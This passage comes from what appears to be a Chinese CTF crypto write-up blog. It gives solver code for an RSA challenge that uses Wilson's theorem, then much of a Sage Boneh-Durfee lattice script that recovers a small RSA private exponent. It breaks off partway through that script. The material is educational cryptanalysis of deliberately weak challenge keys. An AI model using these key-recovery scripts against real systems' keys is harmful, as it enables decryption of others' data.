class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c1 =  <span class="number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line">c2 = <span class="number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line">kn = <span class="built_in">pow</span>(<span class="number">2</span>, e) - c1</span><br><span class="line"><span class="comment"># kn = k*p*q</span></span><br><span class="line"><span class="comment"># 分解得p、q:</span></span><br><span class="line">p = <span class="number">170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span></span><br><span class="line">q = <span class="number">34211</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m_ = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2, d, n))  <span class="comment"># m_不是flag对应的m</span></span><br></pre></td></tr></table></figure><p>看题目代码里，唯一复杂的部分:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for <span class="selector-tag">i</span> in range(<span class="number">1</span>,<span class="selector-tag">p</span>-<span class="selector-tag">q</span>):</span><br><span class="line">    m = m*i%n</span><br></pre></td></tr></table></figure><p>以下，推理其性质</p><p>$$m_0$$(flag对应的)</p><p>$$m1 = (m_0 * 1) \mod n$$</p><p>$$m2 = (((m_0 * 1)\mod n) *2) \mod n = (m_0 * 1 *2) \mod n$$</p><p>$$ m3 = (((m_0 * 1 <em>2)\mod n)</em>3) \mod n = (m_0 * 1 *2 *3) \mod n$$</p><p>…</p><p>$$m_n = (m_0 * p!) \mod n$$</p><blockquote><p>实际做题时，就是看到<strong>阶乘</strong>才知道利用<strong>威尔逊定理</strong></p></blockquote><p>由题目，得：</p><p>m_ = $$(m_0 * (p-q-1)!) \mod n$$</p><p>等号是兼容同余的，由<a href="https://blog.csdn.net/linkfqy/article/details/55505413?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165183209316781683963479%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165183209316781683963479&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-55505413-null-null.142^v9^control,157^v4^new_style&utm_term=同余方程性质&spm=1018.2226.3001.4187">同余性质9</a>有：m_ $≡ (m_0 * (p-q-1)!) \mod p$</p><p>则，有：m_ $= (m_0 * (p-q-1)!) \mod p$</p><p>为使用威尔逊定理，构造出p！</p><p>$(m\_ • [(p-q)•(p-q+1)•…•(p-1)] ) \mod p  = m_0•(p-1)! \mod p$</p><p>由威尔逊定理，得：$(m\_• [(p-q)•(p-q+1)•…•(p-1)])  \mod p  = m_0•(p-1)! \mod p = -m_0 \mod p$</p><p>那么，<code>m0 = (inv(-1, p)*m_ * [(p-q)*(p-q+1)*...*(p-1)]) mod p + k*p</code></p><p>这里另一个难题是，求<code>m_ * ([p-q)*(p-q+1)*...*(p-1)]) mod p)</code></p><p>其实，利用题目的给的格式即可求得，然后爆破m0,解出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p-q, p):</span><br><span class="line">    m_ = m_ * i % p</span><br><span class="line"></span><br><span class="line">m = -m_ % p  <span class="comment"># 本质上是 inv(-1, p)*m_ % q</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k=&#x27;</span>, k)</span><br><span class="line">    m += k*p</span><br><span class="line">    flag = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(flag):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c1 =  <span class="number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line">c2 = <span class="number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line">kn = <span class="built_in">pow</span>(<span class="number">2</span>, e) - c1</span><br><span class="line"><span class="comment"># kn = k*p*q</span></span><br><span class="line"><span class="comment"># 分解得p、q:</span></span><br><span class="line">p = <span class="number">170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span></span><br><span class="line">q = <span class="number">34211</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m_ = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2, d, n))  <span class="comment"># m_不是flag对应的m</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p-q, p):</span><br><span class="line">    m_ = m_ * i % p</span><br><span class="line"></span><br><span class="line">m = -m_ % p  <span class="comment"># 本质上是 inv(-1, p)*m_ % q</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="boneh-durfee-e大d小"><a href="#boneh-durfee-e大d小" class="headerlink" title="boneh_durfee    |e大d小"></a>boneh_durfee    |e大d小</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;novaCTF&#123;******&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">d = getPrime(<span class="number">260</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = invert(d, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># e=  28366532045084591636437544767374939012961757129620507106907154467035496029282857415182567552270978206397793889819857945701555381457862312304572366567535998525153574576210520634959025982966194022680398054500011866734299857844098161391787585786609289654556120958843118695788794035767689727287572845453232286487</span></span><br><span class="line"><span class="comment"># n = </span></span><br><span class="line"><span class="comment"># c = </span></span><br></pre></td></tr></table></figure><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><ul><li><p>e非常非常大，我的本能是Wiener attack.</p><p>实际跑起来，说无解，看来不适用。</p></li><li><p>n也拆不出来</p></li><li><p>搜索题目<code>boneh_durfee</code>,找到F2X师傅师傅给的脚本，跑出了私钥d</p><p><code>d = 1604729467840738070847003596064117868379286998792964612314423127886316878631207</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span 